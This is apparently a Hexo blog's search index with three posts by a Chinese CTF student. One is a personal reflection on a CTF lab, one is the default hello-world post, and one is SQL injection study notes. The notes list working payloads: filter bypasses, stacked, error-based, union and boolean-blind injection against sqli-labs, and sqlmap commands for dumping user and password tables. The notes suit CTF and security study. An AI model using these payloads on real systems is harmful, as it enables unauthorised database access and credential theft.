<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>笔记</title>
    <link href="/2025/02/24/%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/02/24/%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Sql"><a href="#Sql" class="headerlink" title="Sql"></a>Sql</h1><p><strong>空格-&gt;%09</strong></p><p><strong>&#x3D;-&gt;like</strong></p><p><strong>and-&gt;&amp;&amp;</strong></p><p><strong>illegal mix of collation operation ‘UNION’</strong></p><p>这个错误意味着在UNION查询中的两个或多个列使用了不同的字符集或校对规则，导致无法进行正确的合并 操作。 解决方法：统一字符集和校对规则，在sql语句from前添加COLLATE utf8_general_ci</p><p>sql语句加锁，有个提示用户只能从nss来的</p><p>所以sql语句后加where user &#x3D; ‘nss’</p><p>‘ - ‘ 被过滤了所以用100使前面查询不出内容，得到库名</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a><strong>堆叠注入</strong></h2><p><strong>(emm，博客里说过滤了select就是堆叠)</strong></p><p><strong>以;结束命令再在后面加命令一起执行，（这么说所有都可以用堆叠注入喽?）</strong></p><p><strong>补：不是，有什么API巴拉巴拉的限制，可能不行</strong></p><p><strong>命令:</strong></p><p><strong>查数据库(感觉没啥用，爆表会默认当前数据库):</strong> <strong>1’; show databases;</strong></p><p><strong>查表:</strong> <strong>1’; show tables;</strong></p><p><strong>爆表:</strong> *<em>1’;show columns from *(*<em>表名)*;#</em></em></p><p><strong>(表名为数字加<code>  </code>)</strong></p><p><strong>查字段(select被禁)：</strong>[强网杯 2019]随便注1</p><p><strong>1’;Handler <code>1919810931114514</code> OPEN;Handler <code>1919810931114514</code> read first;Handler <code>1919810931114514</code> close;#</strong></p><p><strong>1’; handler <code>1919810931114514</code> open as a; handler a read next;#</strong></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h2><p><strong>获取数据库名</strong></p><p><strong>1’ and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</strong></p><p><strong>不太稳定，嗯</strong></p><p><strong>1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+</strong></p><p><strong>1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+</strong></p><p><strong>1’or(updatexml(1,concat(0x7e,database(),0x7e),1))#</strong></p><p><strong>表</strong></p><p><strong>1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’ ),’^’),1) –+</strong></p><p><strong>1’or(updatexml(1,concat(‘^’,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),’^’),1))</strong></p><p><strong>若超过一行则在table_schema&#x3D;’security’后面加limit 0，1，意思是只显示第一行</strong></p><p><strong>Limit 1，1   2，1   3，1往下一行看</strong></p><p><strong>列</strong></p><p><strong>1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’ limit 0,1 ),’^’),1) –+</strong></p><p><strong>1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))#</strong></p><p><strong>字段</strong></p><p><strong>1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+       只得到了一段</strong></p><p><strong>1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</strong></p><p>字段       表</p><p><strong>1’ and extractvalue(1,concat(‘^’,(select substring(group_concat(id,’^’,flag),31,30) from test_tb)))#          第二段,31,30意思是从第31个字符往后提取30个字符，可改</strong></p><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a><strong>联合注入</strong></h2><p><strong>新生赛wp(现在看应该是数字型，那为什么能直接用呢？还是说是单引号型，只是碰巧)</strong></p><p><strong>先分别输入1，2，3，4，5，到5就不行了，所以有4段，再使用特定语句走流程</strong></p><p><strong>查段数 1’ order by 3#</strong></p><p><strong>1.</strong>   <strong>‘ union select 1,2,3 – ‘</strong></p><p><strong>2.</strong>   <strong>检查数据库信息’ union select 1, 2,3， @@version – ‘</strong></p><p><strong>3.</strong>   <strong>查询数据库名’ union select 1, 2,3， database() – ‘</strong></p><p><strong>4.</strong>   <strong>查用户权限’ union select 1, 2, 3，user() – ‘</strong></p><p><strong>5.</strong>   <strong>查表1’ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</strong> </p><p><strong>6.</strong>   <strong>爆表’ union select 1, 2,3, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctf’– ‘</strong></p><p><strong>7.</strong>      </p><p><strong>8.</strong>   <strong>爆列’ union select 1, 2,3, group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag’ – ‘</strong></p><p><strong>9.</strong>   <strong>查flag’ union select 1,2, group_concat(data) from flag– ‘</strong></p><p><strong>1’ union select 1,2,group_concat(flag) from ctf.Flag</strong></p><p><strong>1’ union select 1,2,group_concat(字段名) from 数据库名.表名</strong></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h2><p><strong>刚看了布尔盲注，我勒个盲注啊，全用二分法一个个试啊，眉头一下子就皱起来了，好麻烦，很哈人，直到看到博主说：一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。把语句记下，去找工具了。</strong></p><p><strong>1．数据库类型</strong></p><p> **&#x2F;&#x2F;**<strong>判断是否是 Mysql数据库</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select*from information_schema.tables) –+</strong></p><p><strong>&#x2F;&#x2F;判断是否是 access数据库</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select*from msysobjects) –+</strong></p><p><strong>&#x2F;&#x2F;判断是否是 Sqlserver数据库</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select*from sysobjects) –+</strong></p><p><strong>2．数据库名</strong></p><p><strong>1：判断当前数据库的长度，利用二分法</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length(database())&gt;5 –+ &#x2F;&#x2F;正常显示</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length(database())&gt;10 –+ &#x2F;&#x2F;不显示任何数据</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length(database())&gt;7 –+ &#x2F;&#x2F;正常显示</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length(database())&gt;8 –+ &#x2F;&#x2F;不显示任何数据</strong></p><p> <strong>大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</strong></p><p><strong>2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</strong></p><p><strong>&#x2F;&#x2F;判断数据库的第一个字符</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr(database(),1,1))&gt;115 –+ &#x2F;&#x2F;100为ascii表中的十进制，对应字母s</strong></p><p><strong>&#x2F;&#x2F;判断数据库的第二个字符</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr(database(),2,1))&gt;100 –+</strong></p><p><strong>&#x2F;&#x2F;判断数据库的第三个字符</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr(database(),3,1))&gt;100 –+</strong></p><p><strong>………..</strong></p><p><strong>由此可以判断出当前数据库为 security</strong></p><p><strong>3．库的表名</strong></p><p><strong>&#x2F;&#x2F;猜测当前数据库中是否存在admin表</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select*from admin) –+</strong></p><p><strong>1：判断当前数据库中表的个数</strong></p><p><strong>&#x2F;&#x2F; 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;3 –+</strong></p><p><strong>2：判断每个表的长度</strong></p><p><strong>&#x2F;&#x2F;判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;6 –+</strong></p><p><strong>&#x2F;&#x2F;判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;6 –+</strong></p><p><strong>3：判断每个表的每个字符的ascii值</strong></p><p><strong>&#x2F;&#x2F;判断第一个表的第一个字符的ascii值</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 –+</strong></p><p><strong>&#x2F;&#x2F;判断第一个表的第二个字符的ascii值</strong>        </p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;100 –+</strong></p><p><strong>由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</strong></p><p><strong>4.表的字段</strong></p><p><strong>&#x2F;&#x2F;如果已经证实了存在admin表，那么猜测是否存在username字段</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select username from admin)</strong> </p><p><strong>1：判断表中字段的个数</strong></p><p><strong>&#x2F;&#x2F;判断users表中字段个数是否大于5</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’)&gt;5 –+</strong></p><p><strong>2：判断每个字段的长度</strong></p><p><strong>&#x2F;&#x2F;判断第一个字段的长度</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1))&gt;5 –+</strong></p><p><strong>&#x2F;&#x2F;判断第二个字段的长度</strong>  </p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1))&gt;5 –+</strong></p><p><strong>3：判断每个字段名字的ascii值</strong></p><p><strong>&#x2F;&#x2F;判断第一个字段的第一个字符的ascii</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100 –+</strong></p><p><strong>&#x2F;&#x2F;判断第一个字段的第二个字符的ascii</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),2,1))&gt;100 –+</strong></p><p><strong>………..</strong></p><p><strong>由此可判断出users表中存在 id、username、password 字段</strong></p><p><strong>5.字段数据</strong></p><p><strong>我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</strong></p><p><strong>1: 判断数据的长度</strong></p><p><strong>&#x2F;&#x2F; 判断id字段的第一个数据的长度</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select id from users limit 0,1))&gt;5 –+</strong></p><p><strong>&#x2F;&#x2F; 判断id字段的第二个数据的长度</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select id from users limit 1,1))&gt;5 –+</strong></p><p><strong>2：判断数据的ascii值</strong></p><p><strong>&#x2F;&#x2F; 判断id字段的第一行数据的第一个字符的ascii值</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select id from users limit 0,1),1,1))&gt;100 –+</strong></p><p><strong>&#x2F;&#x2F; 判断id字段的第二行数据的第二个字符的ascii值</strong></p><p><strong><a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select id from users limit 0,1),2,1))&gt;100 –+</strong></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h2><p><strong>和布尔盲注差不多，布尔是直接显示对错，时间以延迟表示对错，比布尔还麻烦</strong></p><h2 id="http注入"><a href="#http注入" class="headerlink" title="http注入"></a><strong>http注入</strong></h2><p><strong>只是换了个地方注入，ua，xff，cookie等</strong></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><strong>sqlmap</strong></h2><p><strong>快速入门；SQLmap（常规）使用步骤</strong></p><p><strong>1、检测「注入点」</strong></p><p><strong>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘</strong></p><p><strong>1</strong></p><p><strong>2、查看所有「数据库」</strong></p><p><strong>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ –dbs</strong></p><p><strong>1</strong></p><p><strong>3、查看当前使用的数据库</strong></p><p><strong>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ –current-db</strong></p><p><strong>1</strong></p><p><strong>4、查看「数据表」</strong></p><p><strong>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ –tables</strong></p><p><strong>1</strong></p><p><strong>5、查看「字段」</strong></p><p><strong>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –tables</strong></p><p><strong>1</strong></p><p><strong>6、查看「数据」</strong></p><p><strong>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –dump</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF学习心得</title>
    <link href="/2025/02/22/CTF%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"/>
    <url>/2025/02/22/CTF%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<p>​    来到CTF实验室一学期学了一些基础知识，怎么说呢，很幸运能够加入实验室，各位同学都平易近人，幽默风趣。当初杨队的ctf宣传深深的吸引了我，敲敲键盘就把人电脑黑了，帅的一批，于是下定决心要加入实验室学web。</p><p>​    国庆也是听老登们讲解各方向基础知识，也想试试我适合什么方向，结果pwn是真的一点没听懂，只会nc。</p><p>​    回来军训也是招新赛，边打边学边军训，结果发现怎么会有观训✌这种生物啊(悲)，也有两道题在招新赛时百思不得其解，(黑神话)date格式怎么写都不对，最后发现逗号后面少了一个空格。(人类联合之高塔)明文攻击就是爆不出来密码，结果是压缩软件没用对。想起刚学的时候还找谢队问过”Browser是什么””UA是什么”这种问题，现在每次想起都绷不住(当然，招新赛之前问的)。每次看见前五都想说，说好的全是纯小白呢，招新赛偶遇神仙，拼尽全力无法战胜。</p><p>​    每次周赛是既兴奋又担忧，有种进步的兴奋和怕被踢的担忧，还好，至少是留下来了。</p><p>​    写着写着又想到了谢队，偶尔的不正经给大家带来了快乐，实验室内充满了欢快的笑声。</p><p>​    实验室内大家互帮互助，交流学习经验，刚来时都只敢小声说话，极度社恐，现在会求助老登了。</p><p>​    学习上在跟着刘队的安排走，夯实基础</p><p>​    总之，实验室的氛围好，很吸引人，也是团结友爱的大家伙，让人有进步的渴望。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/22/hello-world/"/>
    <url>/2025/02/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
